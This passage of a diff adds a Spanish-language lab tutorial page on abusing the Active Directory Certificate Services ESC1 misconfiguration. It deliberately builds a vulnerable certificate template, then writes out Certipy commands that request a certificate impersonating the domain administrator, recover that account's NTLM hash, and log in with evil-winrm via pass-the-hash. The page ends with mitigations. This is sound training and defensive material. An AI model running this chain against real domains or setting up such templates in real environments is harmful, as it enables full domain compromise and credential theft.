+<p><strong>Proceso de Inscripción (Enrollment)</strong>:<br />
+   El cliente solicita un certificado a la CA basándose en una plantilla. La CA valida los permisos y emite el certificado firmado.</p>
+</li>
+</ol>
+<hr />
+<h3 id="por-que-ad-cs-es-un-objetivo-critico-en-auditorias-ofensivas">¿Por qué AD CS es un objetivo crítico en auditorías ofensivas?<a class="headerlink" href="#por-que-ad-cs-es-un-objetivo-critico-en-auditorias-ofensivas" title="Permanent link">&para;</a></h3>
+<p>Un certificado digital con el EKU de <strong>Client Authentication</strong> es funcionalmente equivalente a conocer la contraseña de una cuenta: permite autenticarse mediante protocolos como <strong>PKINIT</strong> para obtener un Ticket Granting Ticket (TGT) Kerberos o el hash NTLM de dicha cuenta.</p>
+<p>Si una plantilla permite que el propio solicitante defina la identidad (<em>Enrollee Supplies Subject</em>) y además permite la inscripción a usuarios comunes (<code>Domain Users</code> o <code>Authenticated Users</code>), un atacante con una cuenta básica puede solicitar un certificado a nombre del <strong>Domain Administrator</strong> y comprometer la totalidad del dominio.</p>
+<p>Este vector fue documentado exhaustivamente por SpecterOps en su investigación <strong>"Certified Pre-Owned"</strong> (2021), catalogando los escenarios desde ESC1 hasta ESC8+.</p>
+<hr />
+<h2 id="1-instalacion-y-configuracion-de-ad-cs-en-windows-server">1. Instalación y Configuración de AD CS en Windows Server<a class="headerlink" href="#1-instalacion-y-configuracion-de-ad-cs-en-windows-server" title="Permanent link">&para;</a></h2>
+<p>Abrimos el <strong>Server Manager</strong> y hacemos clic en <strong>Add Roles and Features</strong>:</p>
+<p><img alt="Server Manager Roles" src="../assets/Pasted%20image%2020260924185941.png" /></p>
+<p>Avanzamos hasta la sección <strong>Server Roles</strong> y seleccionamos <strong>Active Directory Certificate Services</strong>:</p>
+<p><img alt="Seleccionar AD CS" src="../assets/Pasted%20image%2020260924190632.png" /></p>
+<p>Mantenemos las características requeridas por defecto:</p>
+<p><img alt="Características Requeridas" src="../assets/Pasted%20image%2020260924190839.png" /></p>
+<p>Procedemos con la instalación del rol:</p>
+<p><img alt="Instalación del Rol" src="../assets/Pasted%20image%2020260924190927.png" /></p>
+<h3 id="configuracion-post-instalacion">Configuración Post-Instalación<a class="headerlink" href="#configuracion-post-instalacion" title="Permanent link">&para;</a></h3>
+<p>Finalizada la instalación, pulsamos en el enlace de notificación <strong>Configure Active Directory Certificate Services</strong>:</p>
+<p><img alt="Notificación de Configuración" src="../assets/Pasted%20image%2020260924191158.png" /></p>
+<p>En <strong>Role Services</strong>, marcamos únicamente <strong>Certification Authority</strong>:</p>
+<p><img alt="Role Services CA" src="../assets/Pasted%20image%2020260924191329.png" /></p>
+<p>En <strong>Setup Type</strong>, seleccionamos <strong>Enterprise CA</strong> para integrarla con Active Directory:</p>
+<p><img alt="Enterprise CA" src="../assets/Pasted%20image%2020260924191428.png" /></p>
+<p>En <strong>CA Type</strong>, seleccionamos <strong>Root CA</strong> (al ser la primera y única entidad certificadora del laboratorio):</p>
+<p><img alt="Root CA" src="../assets/Pasted%20image%2020260924191745.png" /></p>
+<p>En <strong>Private Key</strong>, elegimos <strong>Create a new private key</strong>:</p>
+<p><img alt="Create Private Key" src="../assets/Pasted%20image%2020260924191904.png" /></p>
+<p>Mantenemos las opciones criptográficas predeterminadas y hacemos clic en <strong>Configure</strong>:</p>
+<p><img alt="Confirmación Configuración" src="../assets/Pasted%20image%2020260924192308.png" /></p>
+<p>Verificamos la configuración completada con éxito:</p>
+<p><img alt="Configuración Exitosa" src="../assets/Pasted%20image%2020260924192338.png" /></p>
+<hr />
+<h2 id="2-creacion-de-la-plantilla-vulnerable-a-esc1">2. Creación de la Plantilla Vulnerable a ESC1<a class="headerlink" href="#2-creacion-de-la-plantilla-vulnerable-a-esc1" title="Permanent link">&para;</a></h2>
+<p>Abrimos la consola de plantillas de certificados ejecutando <code>certtmpl.msc</code> (<code>Win + R</code>):</p>
+<p><img alt="Consola certtmpl.msc" src="../assets/Pasted%20image%2020260924192828.png" /></p>
+<p>Hacemos clic derecho sobre la plantilla base <strong>User</strong> y seleccionamos <strong>Duplicate Template</strong>:</p>
+<p><img alt="Duplicar Plantilla User" src="../assets/Pasted%20image%2020260924193049.png" /></p>
+<p>En la ventana de propiedades:</p>
+<p><img alt="Propiedades de la Plantilla" src="../assets/Pasted%20image%2020260924193147.png" /></p>
+<p>En la pestaña <strong>General</strong>, asignamos el nombre descriptivo <code>ESC1-vulnerable</code>:</p>
+<p><img alt="Nombre ESC1-vulnerable" src="../assets/Pasted%20image%2020260924193745.png" /></p>
+<p><img alt="Plantilla Nombrada" src="../assets/Pasted%20image%2020260924193956.png" /></p>
+<h3 id="el-factor-vulnerable-subject-name">El Factor Vulnerable: Subject Name<a class="headerlink" href="#el-factor-vulnerable-subject-name" title="Permanent link">&para;</a></h3>
+<p>En la pestaña <strong>Subject Name</strong>, marcamos <strong>Supply in the request</strong>.<br />
+Esta es la mala configuración que da origen a ESC1: permite que el cliente solicite el certificado especificando manualmente cualquier identidad en el Subject Alternative Name (SAN):</p>
+<p><img alt="Supply in the request" src="../assets/Pasted%20image%2020260924194146.png" /></p>
+<h3 id="permisos-de-inscripcion-enrollment">Permisos de Inscripción (Enrollment)<a class="headerlink" href="#permisos-de-inscripcion-enrollment" title="Permanent link">&para;</a></h3>
+<p>En la pestaña <strong>Security</strong>, verificamos que grupos como <code>Authenticated Users</code> o <code>Domain Users</code> dispongan de los permisos <strong>Read</strong> y <strong>Enroll</strong>:</p>
+<p><img alt="Permisos de Seguridad" src="../assets/Pasted%20image%2020260924194512.png" /></p>
+<p>Guardamos los cambios con <strong>Apply</strong> y <strong>OK</strong>.</p>
+<h3 id="publicacion-de-la-plantilla-en-la-ca">Publicación de la Plantilla en la CA<a class="headerlink" href="#publicacion-de-la-plantilla-en-la-ca" title="Permanent link">&para;</a></h3>
+<p>Para que la plantilla esté activa para emisión, abrimos la consola de la CA ejecutando <code>certsrv.msc</code>:</p>
+<p><img alt="Consola certsrv.msc" src="../assets/Pasted%20image%2020260924195236.png" /></p>
+<p>Desplegamos el árbol del servidor, hacemos clic derecho en <strong>Certificate Templates</strong> -&gt; <strong>New</strong> -&gt; <strong>Certificate Template to Issue</strong>:</p>
+<p><img alt="New Certificate Template to Issue" src="../assets/Pasted%20image%2020260924195647.png" /></p>
+<p>Seleccionamos la plantilla <code>ESC1-vulnerable</code>:</p>
+<p><img alt="Seleccionar Plantilla" src="../assets/Pasted%20image%2020260924195724.png" /></p>
+<p>Verificamos que aparezca publicada y lista para emisión:</p>
+<p><img alt="Plantilla Publicada" src="../assets/Pasted%20image%2020260924195751.png" /></p>
+<hr />
+<h2 id="3-enumeracion-y-explotacion-desde-linux-con-certipy">3. Enumeración y Explotación desde Linux con Certipy<a class="headerlink" href="#3-enumeracion-y-explotacion-desde-linux-con-certipy" title="Permanent link">&para;</a></h2>
+<p>Configuramos la resolución DNS en <code>/etc/hosts</code> de nuestra máquina atacante:</p>
+<p><img alt="Configuración /etc/hosts" src="../assets/Pasted%20image%2020260924200046.png" /></p>
+<h3 id="enumeracion-de-plantillas-vulnerables">Enumeración de Plantillas Vulnerables<a class="headerlink" href="#enumeracion-de-plantillas-vulnerables" title="Permanent link">&para;</a></h3>
+<p>Ejecutamos <strong>Certipy</strong> con las credenciales del usuario sin privilegios <code>jose</code>:</p>
+<div class="highlight"><pre><span></span><code>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s1">'jose@domain.com'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'1725j@vik'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.100.50<span class="w"> </span>-vulnerable<span class="w"> </span>-stdout
+</code></pre></div>
+<p><img alt="Salida Certipy Find" src="../assets/Pasted%20image%2020260924200318.png" /></p>
+<p>Certipy identifica de forma automática la vulnerabilidad <strong>ESC1</strong>:</p>
+<div class="highlight"><pre><span></span><code>Certificate Authorities
+  0
+    CA Name                             : domain-SERVIDOR-CA
+    DNS Name                            : servidor.domain.com
+    Certificate Subject                 : CN=domain-SERVIDOR-CA, DC=domain, DC=com
+    Certificate Serial Number           : 6DACF45764E4E7964D5C43E2AD6349FE
+    Certificate Validity Start          : 2026-09-24 19:13:16+00:00
+    Certificate Validity End            : 2031-09-24 19:23:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : DOMAIN.COM\Administrators
+      Access Rights
+        ManageCa                        : DOMAIN.COM\Administrators
+                                          DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Enterprise Admins
+        ManageCertificates              : DOMAIN.COM\Administrators
+                                          DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Enterprise Admins
+        Enroll                          : DOMAIN.COM\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : ESC1-vulnerable
+    Display Name                        : ESC1-vulnerable
+    Certificate Authorities             : domain-SERVIDOR-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-09-24T19:39:11+00:00
+    Template Last Modified              : 2026-09-24T19:46:03+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Domain Users
+                                          DOMAIN.COM\Enterprise Admins
+                                          DOMAIN.COM\Authenticated Users
+      Object Control Permissions
+        Owner                           : DOMAIN.COM\Administrator
+        Full Control Principals         : DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Enterprise Admins
+        Write Owner Principals          : DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Enterprise Admins
+        Write Dacl Principals           : DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Enterprise Admins
+        Write Property Enroll           : DOMAIN.COM\Domain Admins
+                                          DOMAIN.COM\Domain Users
+                                          DOMAIN.COM\Enterprise Admins
+    [+] User Enrollable Principals      : DOMAIN.COM\Domain Users
+                                          DOMAIN.COM\Authenticated Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+</code></pre></div>
+<h3 id="solicitud-de-certificado-suplantando-a-administrator">Solicitud de Certificado Suplantando a Administrator<a class="headerlink" href="#solicitud-de-certificado-suplantando-a-administrator" title="Permanent link">&para;</a></h3>
+<p>Utilizando la plantilla <code>ESC1-vulnerable</code>, solicitamos un certificado a la CA especificando como UPN a <code>administrator@domain.com</code>:</p>
+<div class="highlight"><pre><span></span><code>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">'jose@domain.com'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'1725j@vik'</span><span class="w"> </span>-ca<span class="w"> </span><span class="s1">'domain-SERVIDOR-CA'</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">'ESC1-vulnerable'</span><span class="w"> </span>-upn<span class="w"> </span><span class="s1">'administrator@domain.com'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.100.50
+</code></pre></div>
+<p><img alt="Certificado Emitido para Administrator" src="../assets/Pasted%20image%2020260924200736.png" /></p>
+<p>La CA emite el certificado digital <code>administrator.pfx</code> sin validar si el usuario solicitante tiene autorización para representar a esa identidad.</p>
+<h3 id="autenticacion-via-pkinit-y-obtencion-del-hash-ntlm">Autenticación vía PKINIT y Obtención del Hash NTLM<a class="headerlink" href="#autenticacion-via-pkinit-y-obtencion-del-hash-ntlm" title="Permanent link">&para;</a></h3>
+<p>Utilizamos el archivo <code>.pfx</code> para autenticarnos mediante PKINIT contra el Controlador de Dominio:</p>
+<div class="highlight"><pre><span></span><code>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.100.50
+</code></pre></div>
+<p><img alt="Autenticación PKINIT y Hash NTLM" src="../assets/Pasted%20image%2020260924200937.png" /></p>
+<p>El DC valida la firma de la CA de confianza y entrega el hash NTLM del administrador:</p>
+<div class="highlight"><pre><span></span><code>5541a93368dc77511bc2725b7b8eb44c
+</code></pre></div>
+<h3 id="acceso-total-con-pass-the-hash-evil-winrm">Acceso Total con Pass-the-Hash (Evil-WinRM)<a class="headerlink" href="#acceso-total-con-pass-the-hash-evil-winrm" title="Permanent link">&para;</a></h3>
+<p>Nos conectamos con <code>evil-winrm</code> utilizando el hash obtenido:</p>
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.100.50<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-H<span class="w"> </span>5541a93368dc77511bc2725b7b8eb44c
+</code></pre></div>
+<p><img alt="Acceso Total Administrator" src="../assets/Pasted%20image%2020260924201256.png" /></p>
+<p>¡Hemos obtenido privilegios de Administrador de Dominio completos!</p>
+<hr />
+<h2 id="analisis-tecnico-que-ocurrio">Análisis Técnico: ¿Qué Ocurrió?<a class="headerlink" href="#analisis-tecnico-que-ocurrio" title="Permanent link">&para;</a></h2>
+<h3 id="que-es-pkinit">¿Qué es PKINIT?<a class="headerlink" href="#que-es-pkinit" title="Permanent link">&para;</a></h3>
+<p><strong>PKINIT</strong> (<em>Public Key Cryptography for Initial Authentication</em>) es una extensión del protocolo Kerberos que permite el uso de certificados digitales para la obtención de tickets Kerberos (AS-REQ / AS-REP) en lugar de emplear el hash NTLM o contraseña en texto claro.</p>
+<h3 id="la-causa-raiz-de-esc1">La Causa Raíz de ESC1<a class="headerlink" href="#la-causa-raiz-de-esc1" title="Permanent link">&para;</a></h3>
+<p>Al recibir la petición Kerberos, el Controlador de Dominio verifica únicamente:
+1. Que el certificado esté firmado por una CA de confianza del bosque.
+2. Que el UPN indicado en el certificado exista en el directorio (<code>administrator@domain.com</code>).
+3. <strong>No verifica</strong> qué cuenta realizó la solicitud inicial a la CA.</p>
+<p>La falla reside en la confianza ciega del DC sobre el certificado emitido por la CA con la directiva <em>Enrollee Supplies Subject</em>.</p>
+<hr />
+<h2 id="medidas-de-mitigacion">Medidas de Mitigación<a class="headerlink" href="#medidas-de-mitigacion" title="Permanent link">&para;</a></h2>
+<p>Para proteger las plantillas de certificado frente a vectores ESC1:</p>
+<ol>
+<li>
+<p><strong>Deshabilitar "Supply in the request"</strong>:<br />
+   En <code>certtmpl.msc</code> -&gt; pestaña <strong>Subject Name</strong>, cambiar a <strong>Build from this Active Directory information</strong>. De esta forma, la CA siempre tomará la identidad real del usuario autenticado en Active Directory.</p>
+</li>
+<li>
+<p><strong>Habilitar Aprobación de Administrador (Manager Approval)</strong>:<br />
+   En la pestaña <strong>Issuance Requirements</strong>, activar <strong>CA certificate manager approval</strong>. Las solicitudes quedarán en estado pendiente hasta ser aprobadas manualmente por un administrador de certificados.</p>
+</li>
+<li>
+<p><strong>Restringir Permisos de Enroll</strong>:<br />
+   En la pestaña <strong>Security</strong>, eliminar los permisos de inscripción (<em>Enroll</em>) para <code>Authenticated Users</code> y <code>Domain Users</code>. Otorgar permisos únicamente a grupos específicos y autorizados.</p>
+</li>
+<li>
+<p><strong>Exigir Firmas Autorizadas</strong>:<br />
+   En <strong>Issuance Requirements</strong>, requerir que las solicitudes vengan firmadas previamente por un agente de inscripción autorizado (<em>Enrollment Agent</em>).</p>
+</li>
+</ol>
+<hr />
+<h2 id="recursos-adicionales">Recursos Adicionales<a class="headerlink" href="#recursos-adicionales" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=bM8ImAkwlcY&amp;t=3207s">Video demostrativo de abuso de AD CS</a></li>
+<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">SpecterOps: Certified Pre-Owned Research</a></li>
+</ul>
+<p><img alt="Conclusión AD CS" src="../assets/Pasted%20image%2020260924202101.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../configuracion-ad-basico/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Configuración de AD Básico">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                Configuración de AD Básico
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
